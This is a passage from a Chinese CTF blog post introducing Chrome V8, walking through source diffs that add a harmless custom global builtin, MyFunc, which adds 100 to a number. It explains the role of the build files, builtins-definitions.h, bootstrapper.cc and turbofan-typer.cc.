class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.bazel b/BUILD.bazel</span></span><br><span class="line"><span class="comment">index a3c2438a030..3cd7b9c1630 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.bazel</span></span><br><span class="line"><span class="comment">+++ b/BUILD.bazel</span></span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index ba32e344142..a4e9e463898 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index c163334d7db..15e4b42fea3 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -133,6 +133,7 @@</span> namespace internal &#123;</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32IgnoreFP, TSANStore)                          \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64IgnoreFP, TSANStore)                          \</span><br><span class="line"><span class="addition">+  CPP(MyFunc, kDontAdaptArgumentsSentinel)                                     \</span></span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8IgnoreFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8SaveFP, TSANStore)                              \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/turbofan-typer.cc b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">index 1b09c0f020e..998f9555256 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="meta">@@ -1849,6 +1849,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     return Type::NonInternal();</span><br><span class="line">   &#125;</span><br><span class="line">   switch (function.shared(t-&gt;broker()).builtin_id()) &#123;</span><br><span class="line"><span class="addition">+    case Builtin::kMyFunc:</span></span><br><span class="line"><span class="addition">+      return Type::Number();</span></span><br><span class="line">     case Builtin::kMathRandom:</span><br><span class="line">       return Type::PlainNumber();</span><br><span class="line">     case Builtin::kMathFloor:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index d285b4e7e42..1c273e0f332 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2276,6 +2276,10 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">   native_context()-&gt;set_security_token(*global_object);</span><br><span class="line"></span><br><span class="line">   Factory* factory = isolate_-&gt;factory();</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  &#123;  // -- M y F u n c</span></span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, global_object, &quot;MyFunc&quot;, Builtin::kMyFunc, 1, kDontAdapt);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"></span><br><span class="line">   &#123;  // -- C o n t e x t</span><br><span class="line">     DirectHandle&lt;Map&gt; meta_map(native_context()-&gt;meta_map(), isolate());</span><br><span class="line"><span class="meta">@@ -2768,6 +2772,7 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           DONT_ENUM);</span><br><span class="line">     native_context()-&gt;set_global_parse_int_fun(*parse_int_fun);</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     // Install Number constants</span><br><span class="line">     const double kMaxValue = 1.7976931348623157e+308;</span><br><span class="line">     const double kMinValue = 5e-324;</span><br><span class="line"><span class="meta">@@ -7253,5 +7258,7 @@</span> char* Bootstrapper::RestoreState(char* from) &#123;</span><br><span class="line"> // Called when the top-level V8 mutex is destroyed.</span><br><span class="line"> void Bootstrapper::FreeThreadResources() &#123; DCHECK(!IsActive()); &#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> &#125;  // namespace internal</span><br><span class="line"> &#125;  // namespace v8</span><br></pre></td></tr></table></figure><ul><li>这里也给出参考博客中的<code>myfunc.cc</code>中的具体代码：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">    <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">        value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">        <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                              <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">    <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>修改完编译后就可以得到我们自定义的一个全局函数</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217195916950.png" alt="image-20250217195916950"></p><ul><li>我们就先来介绍一下添加全局函数要修改的这些文件</li></ul><h2 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h2><ul><li>下面均为<code>V8 version 13.5.0</code>的源码</li></ul><h3 id="buildbazel和buildgn"><a href="#BUILD-bazel和BUILD-gn" class="headerlink" title="BUILD.bazel和BUILD.gn"></a>BUILD.bazel和BUILD.gn</h3><ul><li>用于定义如何构建、编译和链接 V8 项目的各个模块和文件。</li><li>也就是这些文件用于要构建、编译和链接的V8项目的源文件，所以我们在<code>src</code>中新建一个文件，这时我们就要将这个文件的路径写入，到这两个文件中，这样我们自定义的功能才能被编译</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213331952.png" alt="image-20250217213331952"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213348299.png" alt="image-20250217213348299"></p><h3 id="builtins-definitionsh"><a href="#builtins-definitions-h" class="headerlink" title="builtins-definitions.h"></a>builtins-definitions.h</h3><ul><li><code>builtins-definitions.h</code>，文件：这个文件主要就是定义<code>JavaScript</code>的内置类型、方法与函数，包括基本类型，比如：<code>整数</code>、<code>浮点数</code>、<code>布尔值</code>、<code>数组</code>、<code>字符串</code>。</li><li>例如下面的代码定义了一些数组的操作：比如<code>ArrayPop</code>，就是对数组的操作。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217210529358.png" alt="image-20250217210529358"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码:488行-499行</span></span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.pop */</span>                                           \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPop, kDontAdaptArgumentsSentinel)                                   \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.push */</span>                                          \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPush, kDontAdaptArgumentsSentinel)                                  \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.shift */</span>                                         \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayShift, kDontAdaptArgumentsSentinel)                                 \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.unshift */</span>                                       \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayUnshift, kDontAdaptArgumentsSentinel)                               \</span><br><span class="line">  <span class="comment">/* Support for Array.from and other array-copying idioms */</span>                  \</span><br><span class="line">  <span class="built_in">TFS</span>(CloneFastJSArray, NeedsContext::kYes, kSource)                           \</span><br></pre></td></tr></table></figure><ul><li>在源码中有<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义，还有<code>ASM()</code>等宏定义。接下来简单介绍一下前三个宏定义。<strong>我们编写内置函数是使用CPP编写，编写其具体功能</strong>。</li><li>而<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义主要决定的是这个函数使用的是<code>编译执行</code>还是<code>解释执行</code>，他们是决定了内建函数如何在 V8 引擎内部执行（编译执行、解释执行、JIT 优化、辅助优化等）</li><li><p>然后介绍一下这个文件中的相关参数：</p><ul><li><p><code>CPP</code>宏定义中的相关参数：</p><ul><li><code>ArrayPop</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFJ</code>宏定义相关参数：</p><ul><li><code>ArrayPrototypePush</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFS</code>宏定义相关参数：</p><ul><li><code>CloneFastJSArray</code>：</li><li><code>NeedsContext::kYes</code>：</li><li><code>kSource</code>：</li></ul></li></ul></li></ul><h3 id="bootstrappercc"><a href="#bootstrapper-cc" class="headerlink" title="bootstrapper.cc"></a>bootstrapper.cc</h3><ul><li>初始化和引导 V8 引擎的运行。它是 V8 启动过程中的核心部分之一，负责执行引擎的初始化和配置工作。</li><li>在这里我们就分析一个比较重要的方法：我们从源码可以看到这个方法从<code>2269</code>行到<code>5051</code>行，占这个文件非常大一部分。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span></span></span><br></pre></td></tr></table></figure><ul><li>我们对数组一些操作的实现，会这这个方法中的里面进行初始化的配置，这样一些名称等都会被初始化，我们才能通过像这样<code>arr.pop()</code>关键字方法使用该功能，这边的<code>&#123;&#125;</code>并不代表函数，只是将一些列操作或者方法给集合在一起，这样就更方便查找。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLast&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLast, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLastIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLastIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;lastIndexOf&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeLastIndexOf, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;pop&quot;</span>, Builtin::kArrayPrototypePop,</span><br><span class="line">                          <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;push&quot;</span>, Builtin::kArrayPrototypePush,</span><br><span class="line">                          <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;reverse&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeReverse, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;shift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeShift, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;unshift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeUnshift, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下<code>SimpleInstallFunction</code>相关参数的具体含义：<ul><li><code>isolate_</code>：</li><li><code>proto</code>：</li><li><code>&quot;findIndex&quot;</code>：</li><li><code>Builtin::kArrayPrototypeFindLastIndex</code>：</li><li><code>kDontAdapt</code>：</li></ul></li></ul><h3 id="turbofan-typercc"><a href="#turbofan-typer-cc" class="headerlink" title="turbofan-typer.cc"></a>turbofan-typer.cc</h3><ul><li><p>这里简单介绍一下<code>turbofan</code>，<code>turbofan</code>是一个编译器，可以将字节码编译为CPU可以直接执行的机器码。</p></li><li><p>这个文件算是一个编译器优化，就添加如下形式就行：</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第1851行</span></span><br><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="comment">// 在上面这个switch中添加下面内容:</span></span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下具体这个函数的具体含义：<ul><li><code>function.shared(t-&gt;broker()).builtin_id()</code>：</li><li><code>Builtin::kMyFunc</code>：</li><li><code>Type::Number()</code>：</li></ul></li></ul><h2 id="添加myfunc全局函数"><a href="#添加MyFunc-全局函数" class="headerlink" title="添加MyFunc()全局函数"></a>添加MyFunc()全局函数</h2><h3 id="新建全局函数文件"><a href="#新建全局函数文件" class="headerlink" title="新建全局函数文件"></a>新建全局函数文件</h3><ul><li>在创建全局函数的时候我们会在这个文件目录下创建这样的文件<code>src/builtins/builtins-xxx.cc</code>，这里面编写的就是这个函数具体实现的功能</li><li>所以我们就先创建一个<code>src/builtins/builtins-myfunc.cc</code>文件，在文件中写入如下代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">        <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">        Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">            value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">            <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                    isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                                  <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">        <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加源文件"><a href="#添加源文件" class="headerlink" title="添加源文件"></a>添加源文件</h3><ul><li>然后我们在<code>BUILD.bazel</code>和<code>BUILD.gn</code>这两个文件中添加我们新建的文件，如果是在开发中最好是按照顺序添加，这样会保证顺序不会乱</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//BUILD.bazel</span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">BUILD.gn</span><br><span class="line">// </span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br></pre></td></tr></table></figure><ul><li>然后在这个文件<code>builtins-definitions.h</code>中添加</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CPP</span>(MyFunc, kDontAdaptArgumentsSentinel)      </span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217222825643.png" alt="image-20250217222825643"></p><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><ul><li>然后在这个文件中<code>bootstrapper.cc</code>，添加如下代码，注意这边需要在</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意需要再这个方法里面添加</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span> </span>&#123;</span><br><span class="line">&#123;  <span class="comment">// -- M y F u n c</span></span><br><span class="line">  <span class="built_in">SimpleInstallFunction</span>(isolate_, global_object, <span class="string">&quot;MyFunc&quot;</span>, Builtin::kMyFunc, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223223065.png" alt="image-20250217223223065"></p><h3 id="设置函数优化"><a href="#设置函数优化" class="headerlink" title="设置函数优化"></a>设置函数优化</h3><ul><li>最后在这个文件中添加<code>turbofan-typer.cc</code>如下代码，需要再<code>switch</code>内部中加入：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223541411.png" alt="image-20250217223541411"></p><ul><li>这些都添加完之后就可以编译源码了，编译后就可以使用自定义的内置函数<code>MyFunc()</code></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217231653794.png" alt="image-20250217231653794"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1>]]></content>
    
    
    <summary type="html">前言：牢QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
